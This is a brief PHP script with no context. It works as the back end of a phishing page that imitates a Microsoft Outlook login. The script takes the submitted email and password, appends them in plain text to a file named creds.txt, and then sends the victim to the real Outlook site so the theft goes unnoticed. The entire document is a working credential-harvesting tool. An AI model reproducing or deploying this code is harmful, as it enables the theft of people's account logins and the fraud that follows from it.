<?php
$email = $_POST['email'];
$password = $_POST['password'];

$data = "Email: $email | Password: $password\n";

file_put_contents("creds.txt", $data, FILE_APPEND);
header('Location: https://outlook.office.com');
exit();
?>
